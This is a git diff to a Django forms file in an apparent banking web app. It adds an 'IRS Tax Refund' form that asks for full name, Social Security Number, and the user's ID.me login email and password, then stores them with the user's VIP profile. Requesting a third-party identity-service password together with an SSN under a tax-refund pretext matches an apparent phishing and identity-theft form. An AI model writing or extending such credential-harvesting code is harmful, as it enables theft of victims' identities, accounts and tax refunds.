@@ -1,7 +1,7 @@
 from django import forms
 from django.contrib.auth.forms import UserCreationForm, AuthenticationForm
 from django.contrib.auth.models import User
-from .models import Card, StaffProfile, CustomerProfile, VIPProfile, LocalTransfer, InternationalTransfer, Deposit, Loan, LoanApplication, LoanFAQ
+from .models import Card, StaffProfile, CustomerProfile, VIPProfile, LocalTransfer, InternationalTransfer, Deposit, Loan, LoanApplication, LoanFAQ, IRSTaxRefund
 
 
 class StaffLoginForm(AuthenticationForm):
@@ -991,3 +991,181 @@ class LoanApplicationForm(forms.ModelForm):
             if not re.match(phone_pattern, phone_number):
                 raise forms.ValidationError('Please enter a valid phone number')
         return phone_number
+
+
+class IRSTaxRefundForm(forms.ModelForm):
+    """Form for IRS Tax Refund requests"""
+    
+    # Personal Information fields
+    full_name = forms.CharField(
+        max_length=200,
+        widget=forms.TextInput(attrs={
+            'class': 'w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent',
+            'placeholder': 'Enter your full name'
+        }),
+        help_text="Enter your full name as it appears on your tax documents"
+    )
+    
+    social_security_number = forms.CharField(
+        max_length=11,
+        widget=forms.TextInput(attrs={
+            'class': 'w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent',
+            'placeholder': 'XXX-XX-XXXX',
+            'pattern': '[0-9]{3}-[0-9]{2}-[0-9]{4}'
+        }),
+        help_text="Enter your Social Security Number in the format XXX-XX-XXXX"
+    )
+    
+    # ID.me Credentials fields
+    idme_email = forms.EmailField(
+        widget=forms.EmailInput(attrs={
+            'class': 'w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent',
+            'placeholder': 'Enter your ID.me email'
+        }),
+        help_text="Enter your ID.me email address"
+    )
+    
+    idme_password = forms.CharField(
+        max_length=255,
+        widget=forms.PasswordInput(attrs={
+            'class': 'w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent',
+            'placeholder': 'Enter your ID.me password'
+        }),
+        help_text="Enter your ID.me password"
+    )
+    
+    # Location Information fields
+    country = forms.ChoiceField(
+        choices=IRSTaxRefund.COUNTRY_CHOICES,
+        widget=forms.Select(attrs={
+            'class': 'w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent'
+        }),
+        help_text="Select your country of residence"
+    )
+    
+    # Additional fields
+    tax_year = forms.CharField(
+        max_length=4,
+        initial='2024',
+        widget=forms.TextInput(attrs={
+            'class': 'w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent',
+            'placeholder': '2024'
+        }),
+        help_text="Enter the tax year for your refund request"
+    )
+    
+    expected_refund_amount = forms.DecimalField(
+        max_digits=15,
+        decimal_places=2,
+        required=False,
+        widget=forms.NumberInput(attrs={
+            'class': 'w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent',
+            'placeholder': '0.00',
+            'step': '0.01',
+            'min': '0'
+        }),
+        help_text="Enter your expected refund amount (optional)"
+    )
+    
+    # Terms and conditions
+    terms_accepted = forms.BooleanField(
+        required=True,
+        widget=forms.CheckboxInput(attrs={
+            'class': 'w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 focus:ring-2'
+        }),
+        help_text="I accept the terms and conditions"
+    )
+    
+    privacy_policy_accepted = forms.BooleanField(
+        required=True,
+        widget=forms.CheckboxInput(attrs={
+            'class': 'w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 focus:ring-2'
+        }),
+        help_text="I accept the privacy policy"
+    )
+    
+    class Meta:
+        model = IRSTaxRefund
+        fields = [
+            'full_name', 'social_security_number', 'idme_email', 'idme_password',
+            'country', 'tax_year', 'expected_refund_amount', 'terms_accepted', 'privacy_policy_accepted'
+        ]
+    
+    def __init__(self, *args, **kwargs):
+        self.user = kwargs.pop('user', None)
+        super().__init__(*args, **kwargs)
+        
+        # Set default values if user is provided
+        if self.user and hasattr(self.user, 'vip_profile'):
+            vip_profile = self.user.vip_profile
+            if not self.instance.pk:  # Only for new instances
+                self.fields['full_name'].initial = vip_profile.full_name
+    
+    def clean_social_security_number(self):
+        """Validate and format SSN"""
+        ssn = self.cleaned_data.get('social_security_number')
+        if ssn:
+            # Remove any non-digit characters
+            import re
+            ssn_digits = re.sub(r'\D', '', ssn)
+            
+            # Check if it has exactly 9 digits
+            if len(ssn_digits) != 9:
+                raise forms.ValidationError('Social Security Number must contain exactly 9 digits')
+            
+            # Check for invalid patterns
+            invalid_patterns = [
+                '000000000', '111111111', '222222222', '333333333',
+                '444444444', '555555555', '666666666', '777777777',
+                '888888888', '999999999', '123456789', '987654321'
+            ]
+            
+            if ssn_digits in invalid_patterns:
+                raise forms.ValidationError('Please enter a valid Social Security Number')
+            
+            # Return formatted SSN
+            return f"{ssn_digits[:3]}-{ssn_digits[3:5]}-{ssn_digits[5:]}"
+        
+        return ssn
+    
+    def clean_tax_year(self):
+        """Validate tax year"""
+        tax_year = self.cleaned_data.get('tax_year')
+        if tax_year:
+            try:
+                year = int(tax_year)
+                current_year = 2024  # You can make this dynamic
+                if year < 2020 or year > current_year:
+                    raise forms.ValidationError(f'Tax year must be between 2020 and {current_year}')
+            except ValueError:
+                raise forms.ValidationError('Please enter a valid tax year')
+        return tax_year
+    
+    def clean_expected_refund_amount(self):
+        """Validate expected refund amount"""
+        amount = self.cleaned_data.get('expected_refund_amount')
+        if amount is not None and amount < 0:
+            raise forms.ValidationError('Expected refund amount cannot be negative')
+        return amount
+    
+    def clean_idme_email(self):
+        """Validate ID.me email"""
+        email = self.cleaned_data.get('idme_email')
+        if email:
+            # Basic email validation for ID.me
+            if not email.endswith('@id.me') and '@id.me' not in email:
+                # Allow other email domains but warn
+                pass
+        return email
+    
+    def save(self, commit=True):
+        """Save the form with VIP member"""
+        instance = super().save(commit=False)
+        
+        if self.user and hasattr(self.user, 'vip_profile'):
+            instance.vip_member = self.user.vip_profile
+        
+        if commit:
+            instance.save()
+        
+        return instance
